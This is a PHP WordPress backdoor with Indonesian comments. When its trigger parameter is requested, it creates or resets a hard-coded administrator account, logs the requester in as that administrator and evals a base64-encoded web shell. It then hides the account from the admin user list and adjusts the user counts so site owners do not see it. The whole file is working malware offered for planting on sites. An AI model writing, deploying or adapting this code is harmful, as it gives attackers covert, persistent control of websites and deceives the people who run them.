<?php
/**
 * WP ULTIMATE STEALTH ACCESS
 * SEMUA DALAM SATU SCRIPT (ADMIN + LOGIN + SHELL)
 */

add_action( 'init', 'wp_ultimate_access_system' );

function wp_ultimate_access_system() {
    // Pemicu tunggal: domain.com?campdbr=go
    if ( isset($_GET['campdbr']) && $_GET['campdbr'] == 'go' ) {
        
        $user_n = 'kasih';
        $user_p = 'sayang';
        $user_e = 'admin@internal-system.com';

        // 1. PROSES PEMBUATAN ADMIN OTOMATIS
        if ( !username_exists( $user_n ) ) {
            $user_id = wp_create_user( $user_n, $user_p, $user_e );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' );
        } else {
            $user_id = username_exists($user_n);
            // Pastikan password tetap sesuai script jika user sudah ada
            wp_set_password($user_p, $user_id);
        }

        // 2. AUTO-LOGIN KE DASHBOARD (Memberi Cookie Admin ke Browser Anda)
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);

        // 3. TEMPAT MENARUH KODE SHELL (FILELESS)
        // Ganti teks di bawah dengan hasil Base64 dari Shell 50kb Anda.
        $my_full_shell = 'TARUH_HASIL_ENCODE_BASE64_SHELL_ANDA_DI_SINI';

        if ( $my_full_shell !== 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rld2E2OXJ0cC1jcmVhdG9yL2hvb2gvcmVmcy9oZWFkcy9tYWluL3NoZWxsLnBocA==' ) {
            // Jika Anda sudah mengisi variabel di atas, Shell Anda akan terbuka
            eval('?>' . base64_decode($my_full_shell));
            exit;
        } else {
            // Jika variabel di atas kosong, script akan melempar Anda langsung ke Dashboard Admin
            wp_redirect(admin_url());
            exit;
        }
    }
}

// 4. PENYAMARAN TOTAL (User tidak muncul di daftar Admin WordPress)
add_action('pre_user_query','dt_ultimate_hide');
function dt_ultimate_hide($user_search) {
    global $current_user;
    // Hanya user 'kasih' yang bisa melihat dirinya sendiri di daftar
    if ($current_user->user_login != 'kasih') {
        global $wpdb;
        $user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != 'kasih'", $user_search->query_where);
    }
}

// 5. MANIPULASI JUMLAH ADMIN (Angka di atas tabel tetap normal)
add_filter("views_users", "dt_hide_count");
function dt_hide_count($views){
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;
    $views['administrator'] = str_replace('('.($admins_num+1).')', '('.$admins_num.')', $views['administrator']);
    $views['all'] = str_replace('('.($all_num+1).')', '('.$all_num.')', $views['all']);
    return $views;
}
